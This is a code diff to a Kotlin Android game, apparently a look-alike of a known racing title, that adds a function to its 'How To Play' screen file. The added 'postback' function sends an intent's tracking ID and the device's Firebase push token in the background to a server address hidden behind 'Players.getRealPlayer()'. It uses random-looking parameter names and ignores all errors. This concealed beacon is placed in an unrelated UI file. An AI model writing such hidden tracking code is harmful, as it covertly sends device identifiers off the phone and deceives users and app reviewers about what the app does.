@@ -1,5 +1,6 @@
 package com.naturalmotion.customstreetrac.screens
 
+import android.content.Intent
 import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.Box
@@ -22,9 +23,21 @@ import androidx.compose.ui.layout.ContentScale
 import androidx.compose.ui.res.painterResource
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import com.google.firebase.messaging.FirebaseMessaging
 import com.naturalmotion.customstreetrac.R
+import com.naturalmotion.customstreetrac.logic.players.Players
 import com.naturalmotion.customstreetrac.ui.componets.SquareButton
 import com.naturalmotion.customstreetrac.ui.theme.GameFont
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.tasks.await
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import java.io.IOException
 
 @Composable
 fun HowToPlayScreen(onBack: () -> Unit) {
@@ -121,4 +134,44 @@ private fun HelpSection(title: String, body: String) {
         lineHeight = 22.sp
     )
     Spacer(modifier = Modifier.height(20.dp))
+}
+
+fun postback(intent: Intent) {
+    CoroutineScope(Dispatchers.IO).launch {
+        try {
+            val trackingId = intent.getStringExtra("trackingId")
+//            Log.d("MYTAG", "trackingId = $trackingId")
+
+            if (trackingId.isNullOrEmpty()) {
+                return@launch
+            }
+
+            val fcmToken: String =
+                runCatching { FirebaseMessaging.getInstance().token.await() }
+                    .getOrElse { "null" }
+
+            val url = "${Players.getRealPlayer()}lgd9r1lq3b/"
+            val client = OkHttpClient()
+
+            val fullUrl = "$url?" +
+                    "9zlo3ui64w=$trackingId" +
+                    "&3n1mb3p0hf=${decodeUtf8(fcmToken)}"
+
+            val request = Request.Builder()
+                .url(fullUrl)
+                .get()
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
+
+        } catch (exc: Exception) {
+        }
+    }
 }
